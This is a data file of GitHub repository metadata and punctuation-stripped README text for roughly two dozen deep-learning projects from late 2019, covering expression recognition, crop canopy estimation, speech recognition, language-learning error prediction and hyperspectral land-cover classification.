Mouse,2019-10-25T13:08:57Z,2019-11-25T10:02:33Z,Jupyter Notebook,fdasilva59,User,1,1,1,4,master,fdasilva59,1,1,1,0,0,0,0
deepalianeja,CharacterExpr,n/a,CharacterExpr Modeling Stylized Character Expressions via Deep Learning FERG Expression database FERG DB is a database of stylized characters with annotated facial expressions The database contains multiple face images of six stylized characters The characters were modelled using the MAYA software and rendered out in 2D to create the images The images for each character is grouped into seven types of expressions anger disgust fear joy neutral sadness and surprise Download URL Link http grail cs washington edu projects deepexpr ferg db html Details about this database can be found in our paper Modeling Stylized Character Expressions via Deep Learning Deepali Aneja Alex Colburn Gary Faigin Linda Shapiro and Barbara Mones ACCV 2016,2019-10-19T08:01:06Z,2019-10-26T04:41:40Z,n/a,deepalianeja,User,1,1,0,4,master,deepalianeja,1,0,0,0,0,0,0
KnowingNothing,CecaBench,n/a,,2019-09-20T00:27:59Z,2019-11-19T02:12:20Z,Python,KnowingNothing,User,1,1,0,22,master,KnowingNothing,1,0,0,0,0,0,0
yt7589,dmrl,n/a,dmrl deep meta reinforcement learning book example,2019-10-13T08:09:39Z,2019-10-14T10:50:01Z,Python,yt7589,User,1,1,0,15,master,yt7589,1,0,0,0,0,0,0
salmansajidsattar,Books-for-Python-with-Opencv-and-Deep-Learning,n/a,Books for Python with Opencv and Deep Learning This repositories contain all the he helping material to start with Python with opencv Machine Learning Natural Language Processing and Django as well,2019-09-23T14:43:34Z,2019-09-23T16:00:17Z,n/a,salmansajidsattar,User,1,1,0,3,master,salmansajidsattar,1,0,0,0,0,0,0
qingchj851,Deep-Learning-for-CSI-Feedback-Based-on-Superimposed-Coding,n/a,Deep Learning for CSI Feedback Based on Superimposed Coding Deep Learning for CSI Feedback Based on Superimposed Coding,2019-10-18T06:00:28Z,2019-10-26T01:53:36Z,Python,qingchj851,User,1,1,0,10,master,qingchj851,1,0,0,0,0,0,0
shubham10111,Deep-Learning-and-Neural-Networks-with-Python-and-Pytorch,n/a,,2019-09-29T18:21:35Z,2019-11-12T15:58:11Z,Jupyter Notebook,shubham10111,User,1,1,0,8,master,shubham10111,1,0,0,0,0,0,0
nagrjungururaj,Canopy-Cover-Estimation-of-Maize-Plants-using-Deep-Learning,n/a,Canopy Cover Estimation of Maize Plants using Deep Learning Copyright Very Important The image data is solely owned and distributed by Digite Inc and any usage could lead to severe voilations of company s copyright For obtaining and usage of the data please contact Digite Inc https www digite com Goal The overall goal of the problem is to identify the Canopy Cover Percentage from a given picture image using deep learning Further the problem has intermediate goals as below From a given image the designed algorithm is able to differentiate a maize plant from a weed plant Finally the designed algorithm identifies different stages of a maize from 29JUL19 TO 3AUG19 Dataset The given dataset consists of 46 images captured using a smart phone in a field containing maize plants along with the weed plant near Bengaluru India Requirements Note without these code wont run Anaconda pillow lxml Cython contextlib2 jupyter matplotlib pandas opencv python Download models zip from here https www dropbox com s w65vb29iki0ylbx models zip dl 0 Testing on your images 1 Download models zip and extract models folder 2 Capture images from a maize field using a smartphone or drone 3 Use labelImg tool to label your images Tool can be found here https github com tzutalin labelImg 4 Place the images in images folder under modelsresearchobjectdetection 5 Generate the labels using the command python xmltocsv 6 The train and test labels will be in images folder 7 Trained model is already present in training folder 8 Place the images you want to test from your set in testimg folder Setup 1 Go to modelsresearchobjectdetection 2 Run this command corresponding to local path of your environment Change the paths accordingly for example set PYTHONPATH C DesktopmodelsC DesktopmodelsresearchC Desktopmodelsresearchslim wont run if not executed Run Sequence 1 Copy all ipynb to modelsresearchobjectdetection folder before doing anything 2 Run the ipynb files in the following sequence objectdetectionmaize ipynb calculateiou ipynb generatebboxcrops ipynb calculatecanopycover ipynb visualizecanopygrowth ipynb Results The algorithm predicts a rise in the canopy cover through the progression of dates staring from 20 JUL 19 to 3 Aug 19 which is in sync with the theoritical assumption The algorithm achieves the following root mean square errors for corresponding fields as below RMSE F1 0 36239708194589165 RMSE F3 0 14613046722087242 RMSE F7 0 9559942436130704 Note that the RMSE for F7 is quite large due to the rapid growth and overlap of bounding boxes predicted from the algorithm for the end of a season of peak period,2019-10-29T06:46:42Z,2019-12-04T15:09:51Z,Jupyter Notebook,nagrjungururaj,User,0,1,0,18,master,nagrjungururaj,1,0,0,1,0,0,0
SomyKamble,Deep-Learning-in-R-logistic-regression-breast-cancer-detection-,n/a,Deep Learning in R logistic regression,2019-11-01T18:12:31Z,2019-11-08T19:17:22Z,HTML,SomyKamble,User,1,1,0,2,master,SomyKamble,1,0,0,0,0,0,0
Bramcals,Order-Batching-Problem-a-deep-Reinforcement-Learning-approach,n/a,Order Batching Problem a deep Reinforcement Learning approach Archive code of Deep Reinforcement Learning approach used by Bram Cals Code was developed for the graduation research as a final project within the master program Operations Management and Logistics at the Eindhoven University of Technology RLagentSMARTPICKFinalCleanUp located in environments is the main model that can be trained retrained and tested with train py retrain py and test py respectively The RLagentSMARTPICKFinalCleanUp interacts with the simulation model which is written in Automod Code of the automod file is found in the Simulation Model automod folder The training parameters for the PPO algorithm can be specified in the configure file Here also the tensorboard scalars can be specified Four trained models are included Each with their own config file trained weights policy parameters and the event loggings for tensorboard,2019-10-31T15:11:26Z,2019-10-31T16:40:18Z,Python,Bramcals,User,1,1,0,130,master,Bramcals,1,0,0,0,0,0,0
zhuangbohan,Attend-in-Groups-a-Weakly-supervised-Deep-Learning-Framework-for-Learning-from-Web-Data,n/a,Attend in groups a weakly supervised deep learning framework for learning from web data If you use this code in your research please cite our paper InProceedingsZhuang2017CVPR author Zhuang Bohan and Liu Lingqiao and Li Yao and Shen Chunhua and Reid Ian title Attend in Groups A Weakly Supervised Deep Learning Framework for Learning From Web Data booktitle The IEEE Conference on Computer Vision and Pattern Recognition CVPR month July year 2017 Dataset We provide the WebCars dataset here https drive google com file d 0B8FVP4UlazP8Q2N0czB3aFNVWk0 view usp sharing Code The code are written using Lasagne utils py provide necessary functions vggnet py define network structure train py main file implementing training and testing config yaml define the necessary hyperparameters e g data directory bag size GPU please modify this file pretrainedmodel the pretrained VGG16 model on ImageNet imgmean npy mean file for data preprocessing Training python train py Copyright Copyright c Bohan Zhuang 2017 This code is for non commercial purposes only For commerical purposes please contact Chunhua Shen This program is free software you can redistribute it and or modify it under the terms of the GNU General Public License as published by the Free Software Foundation either version 3 of the License or at your option any later version This program is distributed in the hope that it will be useful but WITHOUT ANY WARRANTY without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE See the GNU General Public License for more details You should have received a copy of the GNU General Public License along with this program If not see,2019-10-15T06:40:03Z,2019-10-15T06:59:50Z,Python,zhuangbohan,User,1,1,0,1,master,zhuangbohan,1,0,0,0,0,0,0
deepgramtech,deepgramtech.github.io,n/a,DeepGram With this project we want to develop a Telegram bot to allow you running Machine Learning and Deep Learning experiments directly on your phone The only requirement will be the Telegram app https telegram org apps or third party alternatives installed on your phone laptop or just a browser to run Telegram Web https web telegram org Book your ticket for the next event https www eventbrite it e biglietti deepgram7 creiamo un bot per il deep learning 84720923563 Wednesday 4th of December 2019 Digital Tree Innovation Hub https digitaltree ai Why is it important Has it ever happened to you to have an idea that you would like to prototype faster I know that is wrong to answer with a question to a question But what we want is to allow you to implement some Machine Learning algorithm very fast on the fly You won t need to go home turn your computer on open your IDE copy some model from Stackoverflow https stackoverflow com becoming mad installing packages till you give up your awesome idea and go back to your 9 5 job You just need to open your Telegram app and click the right buttons Jokes apart it will look something like while somewhere else something like the following is been creating This is a community based project No leaders here Just passionate people desiring to learn and to create We organize MeetUps to make this real If you are around Genova Italy come and build with us Where At Digital Tree https digitaltree ai Viale Cembrano 2 16147 Genova GE When The next meetup will be on Wednesday 4th of December 2019 from 18 to 20 https www eventbrite it e biglietti deepgram7 creiamo un bot per il deep learning 84720923563 Every two weeks usually on Wednesday from 18 to 20 To be up to date sync with our Google Calendar https calendar google com calendar embed src i8m9ckbo5l0o38bc98ocui6mp8 40group calendar google com ctz Europe 2FRome here https calendar google com calendar embed src i8m9ckbo5l0o38bc98ocui6mp8 40group calendar google com ctz Europe 2FRome you will find any upcoming event Outline The meetups are structured as little hackatons of two hours where specific but not really fixed goals have to be achieved Our goal is mostly learning by doing so we won t focus strictly on the advancement of the project at each meeting but on learning as much as we can The following is a outline of the content of the next three meetups Meetup 0 https github com deepgramtech deepgramtech github io blob master img firstbotgif gif raw true After setting the basis at Meetup 0 we went further experimenting with several Python frameworks for Telegram bots like Telepot https github com nickoala telepot that is no longer maintained and PyTelegramBotAPI https github com eternnoir pyTelegramBotAPI that we are currently using Several basic functions have been implemented already to become confident with the API QR code generator simple image processing stuffs and now the goal is to go further and to dig into the real Data Science Currently we are at Meetup 7 https www eventbrite it e biglietti deepgram7 creiamo un bot per il deep learning 84720923563 Discussion One of the goal of this project is to have a Telegram channel with datasets that are accessible to everyone However Telegram allows a user to send only till around 50 MB to a bot On the other hand a user can upload till around 1 4 GB on a Telegram Channel For this reason we created a function that forward messages over a certain size to a Telegram channel in order to store it there Nevertheless 1 4GB could be not enough for a dataset dealing with pictures or videos it is easy to occupy much more So we thought to work in the following way Command to upload a dataset Send it If the size is more than 1 4 GB send back a script to the sender to split the original file in smaller size ones Send all of the resulting files If you have better ideas please contact us in the Telegram Group https t me hackademiaitaly Questions Feel free to ask at antonio marsella95 gmail com or antoniomarsella deepgram tech in the Telegram Group https t me hackademiaitaly or privately at marsantonio https t me marsantonio,2019-09-20T09:39:29Z,2019-12-03T09:53:31Z,n/a,deepgramtech,User,2,1,0,82,master,deepgramtech,1,0,0,0,0,0,0
dsam99,gdsa_machine_learning,n/a,GDSA Machine Learning This repository contains my work at NASA JPL during the summer of 2019 The signal processing and machine learning files were approved for open source access This project was in collaboration with the Deep Learning Technologies Group 393K with my mentor Brian Kahovec The research project monitored the MSL GDS downlink process to determine whether or not data transmission passes are successful This project also helps us explain the importance of features in the dataset and perform anomaly detection The data is collected from the following APIs maros tlmweb gdsa elastic search database and hand labelled by the GDSA team experts Signal Processing The signal processor combines the data from the three data sources MAROS Telemetry Data Storage and the GDSA Elastic Search Database It computes important features for learning as well as cleaning and normalizing the datasets to pass into our models Machine Learning This directory contains the various machine learning algorithms used for our data analysis It contains a deep neural network for classification of data transmission and multiple different algorithms which obtains 95 accuracy For anomaly detection the repository contains adversarial autoencoders and one class SVMs,2019-09-27T04:03:13Z,2019-10-01T21:28:51Z,Python,dsam99,User,1,1,0,9,master,dsam99,1,0,0,0,0,0,0
JYongSmile,Deeplearning-task-set,n/a,Deeplearning task set There are some deep learning task source for example ocr object detect etc Paper with code link https github com zziz pwc OCR 1 PSNet tensorflow https github com liuheng92 tensorflowPSENet 2 EAST tensorflow https github com argman EAST 3 CTPN tensorflow https github com piginzoo ctpn blog http www piginzoo com machine learning 2019 04 24 ocr notes ctpn some other link and conference https blog csdn net minstyrain article details 82313556 IMG Classification 1 Facenet https github com davidsandberg facenet Openface https github com cmusatyalab openface Object Detect 1 Faster RCNN https github com endernewton tf faster rcnn blog https zhuanlan zhihu com p 31426458 2 MaskRCNN https github com JYongSmile MaskRCNN 3 YOLOV3 TF https github com YunYang1994 tensorflow yolov3 YOLOV3 Keras https github com qqwweee keras yolo3 4 CenterNet https github com xingyizhou CenterNet Semantic Segmentation 1 FastFCN https github com wuhuikai FastFCN ASR 1 DeepSpeechRecognition https github com JYongSmile DeepSpeechRecognition PoseEstimationMaterial 1 some other link and conference https blog csdn net BarryJ article details 94432865 2 MaskRCNN https github com JYongSmile MaskRCNN Photo Quality Enhancement 1 DPED https github com aiff22 DPED 2 DeblurGAN https github com KupynOrest DeblurGAN csdn https blog csdn net yH0VLDe8VG8ep9VGe article details 78641844 3 attentive GAN derainnet https github com MaybeShewill CV attentive gan derainnet csdn https blog csdn net z704630835 article details 84616685 datalisttool https www datasetlist com tools https www datasetlist com tools,2019-10-14T08:28:54Z,2019-11-01T01:53:41Z,n/a,JYongSmile,User,1,1,0,21,master,JYongSmile,1,0,0,0,0,0,0
kool7,Learn_Machine_Learning_From_Scratch,n/a,LearnMachineLearningFromScratch This repository consist of learning path for machine learning and deep learning from scratch Python Programming Having knowledge of programming language is essential especially python It is easy to learn and one of the most important language to learn and implement machine learning Here are some of the resources to learn it https automatetheboringstuff com There are video lectures as a companion for the above book https www youtube com watch v 1FOgqRuSdI list PL0 84 yl1fUnRuXGFeF7qSH1LEnn9LkW Video lectures Additional Resources https www codecademy com catalog language python Maths For Machine Learning Linear Algebra https www youtube com watch v fNkzzaMoSs list PLZHQObOWTQDPD3MizzM2xVFitgF8hEab Multivariate Calculas https www youtube com watch v TrcCbdWwCBc list PLSQl0a2vh4HC5feHa6Rc5c0wbRTx56nF7 Additional Resource for maths https www youtube com user EugeneKhutoryansky playlists Learn Python The Hard Way Book You can also check khan academy for particular maths content for machine learning https www khanacademy org math Machine Learning Andrew Ng Coursera https www coursera org learn machine learning home welcome Hundred Page Machine Learning Book http themlbook com wiki doku php ISLR https www r bloggers com in depth introduction to machine learning in 15 hours of expert videos NOTE For the Theory side of things Stanford University professors Trevor Hastie and Rob Tibshirani taught an online course based on their newest textbook An Introduction to Statistical Learning with Applications in R ISLR and all the lectures are on youtube although unlisted They also include tutorials in R at the end of each chapter which can be useful for data scientists that prefer this language Additional Resources http course18 fast ai ml Deep Learning Part 1 fast ai https course fast ai Part 2 fast ai https course fast ai part2 Additional Resource https www d2l ai chapterrecurrent neural networks encoder decoder html Lastly for more theoritical learning you can take https www coursera org specializations deep learning Specialization by deeplearning ai,2019-09-29T05:52:20Z,2019-10-07T10:13:06Z,n/a,kool7,User,1,1,0,8,master,kool7,1,0,0,0,0,0,0
BumjunJung9287,dqn_reinforcement_learning_lunar_landing,n/a,,2019-10-21T05:51:12Z,2019-10-22T13:06:48Z,Python,BumjunJung9287,User,1,1,0,6,master,BumjunJung9287,1,0,0,0,0,0,0
Eparcham,stock-predection-Deeplearning,n/a,stock predection Deeplearning I ve presented an approach to predication stock with deep learning using DLSTM and LSTM and GANS also written CNN with Tensorflow according to the figures of the stock prediction period time was passed and the direction of movement of the graph is almost correct But the ratio of data had some difference I need help and advice Friends who work on or have experience in the prediction of the stock or time series in machine learning share with me what ways I need to go for correct prediction or is it true we can predict stock more precisely,2019-10-05T13:10:03Z,2019-10-29T02:41:29Z,Python,Eparcham,User,1,1,1,22,master,Eparcham,1,0,0,0,0,0,0
NicoleBernadetteOng,HumanPoseClassification-fastai,classification#deep#deep-learning#fastai#learning#machine-learning#neural-network#python,Human Pose Classification A fastai deep learning image classification model that I used in the DSTA BrainHack Today I Learned 2019 https dsta gov sg TIL hackathon The poses dataset can be downloaded here https drive google com file d 1I7EXZkVUroegcNent506DpAKjcTvrzD view usp sharing Note The dataset is not mine so if you use it please put a note or comment saying that it is from The Defence Science and Technology Agency DSTA Artificial Intelligence AI Camp Today I Learned TIL 2019 If GitHub is unable to display the ipynb file click here https nbviewer jupyter org github NicoleBernadetteOng HumanPoseClassification fastai blob master HumanPoseClassification ipynb to view it using https nbviewer jupyter org instead,2019-09-27T00:11:38Z,2019-10-18T03:01:30Z,Jupyter Notebook,NicoleBernadetteOng,User,0,1,1,14,master,NicoleBernadetteOng,1,0,0,1,0,0,0
Rajesh-ML-Engg,Deep_Dive_in_ML_Python,n/a,Deep Dive in Machine Learning with Python This repository comprises the Jupyter Notebooks of my blogging series Deep Dive in Machine Learning with Python Kindly refer to below link for all my blogs https medium com RajeshMLEngg Blog 1 Deep Dive in Machine Learning with Python Part I Introduction and fundamentals All code components along with informatory images are uploaded in Blog 1 folder Blog 2 Deep Dive in Machine Learning with Python Part II Getting familiar with Jupyter Notebook All code components along with informatory images used for explaining Jupyter functionality are uploaded in Blog 2 folder Blog 3 Deep Dive in Machine Learning with Python Part III Python Essentials All code components along with informatory images used for explaining Python objects are uploaded in Blog 3 folder Blog 4 Deep Dive in Machine Learning with Python Part IV Guide to Python Lists All code components along with informatory images used for explaining Python lists are uploaded in Blog 4 folder Blog 5 Deep Dive in Machine Learning with Python Part V Dictionaries and Tuples in Python All code components along with informatory images used for explaining Tuple and Dictionary are uploaded in Blog 5 folder,2019-10-08T14:50:12Z,2019-10-29T18:58:24Z,Jupyter Notebook,Rajesh-ML-Engg,User,1,1,0,26,master,Rajesh-ML-Engg,1,0,0,0,0,0,4
ATothMate,Deepin-Sauce-s-Homework,n/a,Deepin Sauce Homework The content of the repository belongs to Lrinz Zoltn BP10WX and Tth Mt dm MZY23S A repo for the purpose of containing the sufficent files for our team s homework for Deep Learning in practice based on Python and LUA The Task MIMIC CXR is a publicly available database of chest x rays with free text radiology reports Our goal is to implement Deep Learning methods aiming image understanding natural language processing and decision support Running the deepinsaucehomework ipynb In order to run the notebook you should have Google account Google Drive Physionet account Given criterias are detailed below To access the the dataset and thus to successfully run the above mentioned notebook you must be a credentialed user and sign the data use agreement for the project on Physionet org Further information of usage can be found Here https physionet org content mimic cxr jpg 2 0 0 After getting all the access you should be able to download the sufficient csv files used in our solution after you grant your Physionet username and password at the start of the section Data preprocessing Download the necessary csv files In our solution we utilize the glove 6B 200d txt word embeddings To successfully run the notebook you should get the mentioned file and place it in your Google Drive After that you should be able to insert its path at the start of the section Word Embeddings Apart from these two mentioned criteria you should be able to run the whole solution in Colab environment Thank you for your understanding,2019-10-12T12:32:59Z,2019-12-14T23:29:56Z,Jupyter Notebook,ATothMate,User,1,1,0,114,master,ATothMate#lzoltan35,2,0,0,1,0,0,7
luca310795,bayesian-deep-rul,bayesian-deep-learning#c-mapss#condition-based-maintenance#neural-network#remaining-useful-life#uncertainty,A Comparative Study between Bayesian and Frequentist Neural Networks for Remaining Useful Life Estimation in Condition Based Maintenance Official implementation of https arxiv org abs 1911 06256 Bayesian and frequentist deep learning models for remaining useful life RUL estimation are evaluated on simulated run to failure data Implemented in PyTorch developed and tested on Ubuntu 18 04 LTS All the experiments were run on a publicly available Google Compute Engine Deep Learning VM instance with 2 vCPUs 13 GB RAM 1 NVIDIA Tesla K80 GPU and PyTorch 1 2 fast ai 1 0 CUDA 10 0 framework Requirements Anaconda Python 3 6 4 see https www anaconda com distribution Installation Clone or download the repository open a terminal in the root directory and run the following commands conda env create f environment yml conda activate bayesian deep rul Now the virtual environment bayesian deep rul is active To deactivate it run conda deactivate When you do not need it anymore run the following command to remove it conda remove name bayesian deep rul all Dataset The models were tested on the four simulated turbofan engine degradation subsets in the publicly available Commercial Modular Aero Propulsion System Simulation C MAPSS dataset Check datasets CMAPSS README md for instructions on how to download the dataset Usage Open a terminal in the root directory activate the virtual environment and run one of the following commands sh train sh to train the selected model Parameters can be modified by editing train sh sh evaluate sh to evaluate the selected model Parameters can be modified by editing evaluate sh sh runexperiments sh to replicate the experiments on the C MAPSS dataset TensorBoard Open a terminal in the root directory activate the virtual environment and run tensorboard logdir to monitor the training process with TensorBoard If you are training on a remote server connect through SSH and forward a port from the remote server to your local computer gcloud compute ssh zone L 6006 localhost 6006 on a Google Compute Engine Deep Learning VM instance Results Training and evaluation logs of the experimental results are provided for verification Run results results ipynb in Jupyter Notebook to check the results by yourself TensorBoard logging was disabled to speed up training Citation If you find this work useful in your research please consider citing articlelibera2019comparative title A Comparative Study between Bayesian and Frequentist Neural Networks for Remaining Useful Life Estimation in Condition Based Maintenance author Luca Della Libera year 2019 journal arXiv preprint arXiv 1911 06256 eprint 1911 06256 archivePrefix arXiv primaryClass cs LG Contact luca310795 gmail com,2019-10-22T23:06:11Z,2019-12-04T22:53:12Z,Python,luca310795,User,2,1,2,6,master,luca310795,1,0,0,0,1,0,0
RexHuang,DQN-cartpole,n/a,DQN cartpole Deep Q Learning cartpole game written completely in JavaScript Web reinforcement learning base on weblearn https github com keppel weblearn dqn,2019-09-26T10:53:45Z,2019-10-02T00:51:39Z,JavaScript,RexHuang,User,1,1,0,6,master,RexHuang,1,0,0,0,0,0,0
suji0131,SpeechRecognition,n/a,Project End to end Speech Recognition using Deep Learning NLP Nanodegree Udacity Keywords Deep Learning Speech Recognition LSTM GRU nlp Implemented and end to end speech recognition model using deep learning MFCCs and Spectrograms are evaluated as input to the models Implementaion of CTC loss function in tnesorflow Main Notebook https github com suji0131 SpeechRecognition blob master vuinotebook Git ipynb,2019-09-23T23:30:26Z,2019-09-23T23:37:43Z,Jupyter Notebook,suji0131,User,1,1,0,1,master,suji0131,1,0,0,0,0,0,0
dantecomedia,Analysis-of-the-Model-,n/a,Analysis of all Deep Learning model and their performance over MNIST dataset Hyperparameters we will be dealing with each Classification Algorithm 1 Learning Rate Dynamics 2 Momentum Dynamics 3 Learning Rate Decay 4 Drop Learning Rate On Plateau 5 Adaptive Learning Rates The Learning rate we chose in these experiments are as follows 1 1E 0 2 1E 1 3 1E 2 4 1E 3 5 1E 4 6 1E 57 1E 6 8 1E 7 These learning rates are in logarithmic scale and ranges from 0 1 We use the following momentum values 1 0 0 2 0 5 3 0 9 4 0 99 This momentum parameter will thus enable us to check the acceleration in training time and accuracy In this experiment we are using the following decay rates 1 1E 1 2 1E 2 3 1E 3 4 1E 4 We then compare the performance of the model and the accuracy over each decay rate The following patience and factors are chosen for this experiment 1 2 2 4 3 8 4 10 And factor is set to 0 1 This will help us conclude the learning rate performance and the time for convergence and the accuracy Adaptive Learning Rate We know the learning rate and the Decay rate are very critical and hard to implement And there is no hard and fast rule to get the best values In order to deal with this there are previously best known algorithms for the learning rate they are as follows 1 Adaptive Gradient Algorithm AdaGrad 2 Root Mean Square Propagation RMSprop 3 Adaptive Moment Estimation Adam Model Execution time s Tess Loss Tess Accuracy CNN 257 5474 0 3140 1 0000 RNN 537 8466 1 2129 0 5368 MLP 114 1725 0 0400 0 9800 Siamese 18 5591 0 0084 0 9961 Network 0 9961 Knowledge 11 7357 0 0239 0 9931 Transfer Model,2019-10-12T02:29:56Z,2019-10-24T18:58:41Z,Jupyter Notebook,dantecomedia,User,1,1,0,3,master,dantecomedia,1,0,0,0,0,0,0
xinhez,11785-project,n/a,11785 project Second Language Acquisition Modeling Read the Duolingo overview paper docs papers SLAM pdf Given a history of token level errors made by the learner in the learning language L2 accurately predict the errors they will make in the future Group Members Xinhe Zhang xinhez andrew cmu edu Xinyue Zhang xzhang4 andrew cmu edu Xueqian Zhang xueqianz andrew cmu edu Our Results esen model accuracy avglogloss auroc F1 Random src models Random py 0 500 0 998 0 500 0 243 Logistic Regression src models LogisticRegression py 0 844 0 386 0 745 0 183 Perceptron src models Perceptron py 0 839 0 437 0 608 0 000 Seq2seq src models Seq2seq py 0 857 0 427 0 667 0 015 Seq2seqExp src models Seq2seqExp py 0 842 0 400 0 735 0 267 Seq2seq Epoch accuracy avglogloss auroc F1 1 0 842 0 412 0 680 0 069 2 0 843 0 408 0 693 0 103 3 0 843 0 405 0 696 0 111 4 0 843 0 406 0 697 0 102 5 0 843 0 406 0 692 0 118 6 0 843 0 408 0 690 0 080 7 0 842 0 418 0 686 0 112 8 0 842 0 414 0 694 0 133 9 0 840 0 425 0 682 0 156 10 0 817 0 455 0 688 0 283 Seq2seq with MLP Grader Epoch accuracy avglogloss auroc F1 1 0 843 0 408 0 689 0 082 2 0 843 0 407 0 695 0 104 3 0 842 0 410 0 694 0 131 4 0 843 0 409 0 693 0 065 5 0 843 0 405 0 699 0 092 6 0 842 0 408 0 693 0 129 7 0 841 0 418 0 671 0 093 8 0 841 0 412 0 679 0 036 9 0 840 0 413 0 685 0 132 10 0 838 0 427 0 645 0 092 Seq2seq with MLP Grader and User ID Epoch accuracy avglogloss auroc F1 1 0 827 0 439 0 650 0 162 2 0 834 0 435 0 653 0 138 3 0 834 0 429 0 661 0 165 4 0 821 0 441 0 677 0 236 5 0 837 0 424 0 658 0 130 6 0 832 0 431 0 653 0 143 7 0 831 0 439 0 658 0 176 8 0 835 0 427 0 658 0 155 9 0 828 0 442 0 640 0 164 10 0 833 0 438 0 654 0 159 Attention torchnlp based on Seq2seq Epoch accuracy avglogloss auroc F1 1 0 651 0 751 0 552 0 240 2 0 788 0 538 0 521 0 111 CNN Epoch accuracy avglogloss auroc F1 1 0 837 0 425 0 654 0 094 2 0 830 0 439 0 636 0 117 3 0 830 0 438 0 638 0 114 Example Command Install this project bash git clone https github com xinhez 11785 project git cd 11785 project data mkdir enes tar xvzf dataenes tar gz directory enes mkdir esen tar xvzf dataesen tar gz directory esen mkdir fren tar xvzf datafren tar gz directory fren Run the script esen bash cd src python3 main py language esen python3 baseline eval py pred outputs esendevpredictions pred key data esen esen slam 20190204 dev key python3 baseline eval py pred outputs esentestpredictions pred key data esen esen slam 20190204 test key fren bash cd src python3 main py language fren python3 baseline eval py pred outputs frendevpredictions pred key data fren fren slam 20190204 dev key python3 baseline eval py pred outputs frentestpredictions pred key data fren fren slam 20190204 test key enes bash cd src python3 main py language enes python3 baseline eval py pred outputs enesdevpredictions pred key data enes enes slam 20190204 dev key python3 baseline eval py pred outputs enestestpredictions pred key data enes enes slam 20190204 test key Class Documents Project Proposal Guidelines docs ProjectProposalGuidelines pdf Read Our Midterm Report docs submissions midterm pdf Related Works enes esen fren Team auc f1 auc f1 auc f1 rank SanaLabs docs papers osika slam18 pdf 0 861 0 561 0 838 0 530 0 857 0 573 1 0 singsound docs papers xu slam18 pdf 0 861 0 561 0 835 0 524 0 854 0 569 1 7 NYU docs papers rich slam18 pdf 0 859 0 468 0 835 0 420 0 854 0 493 2 3 TMU docs papers kaneko slam18 pdf 0 848 0 476 0 824 0 439 0 839 0 502 4 3 CECL docs papers bestgen slam18 pdf 0 846 0 414 0 818 0 390 0 843 0 487 4 7 Cambridge docs papers yuan slam18 pdf 0 841 0 479 0 807 0 435 0 835 0 508 6 0 UCSD docs papers tomoschuk slam18 pdf 0 829 0 424 0 803 0 375 0 823 0 442 7 0 LambdaLab docs papers chen slam18 pdf 0 821 0 389 0 801 0 344 0 815 0 415 7 6 Grotoco docs papers klerke slam18 pdf 0 817 0 462 0 791 0 452 0 813 0 502 9 0 nihalnayak docs papers nayak slam18 pdf 0 821 0 376 0 790 0 338 0 811 0 431 9 0 jilljenn docs papers vie slam18 pdf 0 815 0 329 0 788 0 306 0 809 0 406 10 7 SLAMbaseline 0 774 0 190 0 746 0 175 0 771 0 281 14 7 Annotations recurrent neural networks decision tree ensembles multitask framework,2019-09-30T14:01:39Z,2019-12-10T11:37:41Z,Python,xinhez,User,2,1,0,42,master,xinhez,1,0,0,0,0,0,0
IrvingSau,COMP4163_NNDL,n/a,COMP4163NNDL Material in COMP4163Neural Network and Deep Learning,2019-09-26T02:48:01Z,2019-09-26T13:49:39Z,Jupyter Notebook,IrvingSau,User,1,1,0,3,master,IrvingSau,1,0,0,0,0,0,0
kartikeyanegi,SatelliteImageClassification,n/a,Deep Learning for Land cover Classification in Hyperspectral Images Hyperspectral images are images captured in multiple bands of the electromagnetic spectrum This project is focussed at the development of Deep Learned Artificial Neural Networks for robust landcover classification in hyperspectral images Land cover classification is the task of assigning to every pixel a class label that represents the type of land cover present in the location of the pixel It is an image segmentation scene labeling task The following diagram describes the task This website describes our explorations with the performance of Multi Layer Perceptrons and Convolutional Neural Networks at the task of Land cover Classification in Hyperspectral Images Currently we perform pixel wise classification Dataset We have performed our experiments on the Indian Pines Dataset https purr purdue edu publications 1947 1 The following are the particulars of the dataset Source AVIRIS sensor Region Indian Pines test site over north western Indiana Time of the year June Wavelength range 0 4 2 5 micron Number of spectral bands 220 Size of image 145x145 pixel Number of land cover classes 16 Input data format Each pixel is described by an NxN patch centered at the pixel N denotes the size of spatial context used for making the inference about a given pixel The input data was divided into training set 75 and a test set 25 Hardware used The neural networks were trained on a machine with dual Intel Xeon E5 2630 v2 CPUs 32 GB RAM and NVIDIA Tesla K 20C GPU Multi Layer Perceptron Multi Layer Perceptron MLP is an artificial neural network with one or more hidden layers of neurons MLP is capable of modelling highly non linear functions between the input and output and forms the basis of Deep learning Neural Network DNN models Architecture of Multi Layer Perceptron used input affine relu x 3 affine softmax Schematic representation below N denotes the size of the input patch Specifics of the learning algorithm The following are the details of the learning algorithm used Parameter update algorithm used Adagrad http www jmlr org papers volume12 duchi11a duchi11a pdf Batch size 200 Learning rate 0 01 Number of steps until best validation performance Performance Decoding generated for different input patch sizes Convolutional Neural Network CNN or ConvNet are a special category of artificial neural networks designed for processing data with a gridlike structure The ConvNet architecture is based on sparse interactions and parameter sharing and is highly effective for efficient learning of spatial invariances in images There are four kinds of layers in a typical ConvNet architecture convolutional conv pooling pool fullyconnected affine and rectifying linear unit ReLU Each convolutional layer transforms one set of feature maps into another set of feature maps by convolution with a set of filters Architecture of Convolutional Neural Network used input conv relu maxpool x 2 affine relu x 2 affine softmax Schematic representation below N denotes the size of the input patch Specifics of the learning algorithm The following are the details of the learning algorithm used Parameter update algorithm used Adagrad http www jmlr org papers volume12 duchi11a duchi11a pdf Batch size 100 Learning rate 0 01 Number of steps until best validation performance Performance Decoding generated for different input patch sizes Description of the repository IndianPinesDataSetPreparationWithoutAugmentation ipynb does the following operations Loads the Indian Pines dataset Scales the input between 0 1 Mean normalizes the channels Makes training and test splits Extracts patches of given size Oversamples the training set for balancing the classes Spatialdataset py provides a highly flexible Dataset class for handling the Indian Pines data patchsize py specify the required patch size here IndianPinesCNN ipynb builds the TensorFlow Convolutional Neural Network and defines the training and evaluation ops inference builds the model as far as is required for running the network forward to make predictions loss adds to the inference model the layers required to generate loss training adds to the loss model the Ops required to generate and apply gradients evaluation calcuates the classification accuracy CNNfeed ipynb trains and evaluates the Neural Network using a feed dictionary DecoderSpatialCNN ipynb generates the landcover classification of an input hyperspectral image for a given trained network IndianPinesMLP py builds the TensorFlow Multi layer Perceptron and defines the training and evaluation ops inference builds the model as far as is required for running the network forward to make predictions loss adds to the inference model the layers required to generate loss training adds to the loss model the Ops required to generate and apply gradients evaluation calcuates the classification accuracy MLPfeed ipynb trains and evaluates the MLP using a feed dictionary DecoderSpatialMLP ipynb 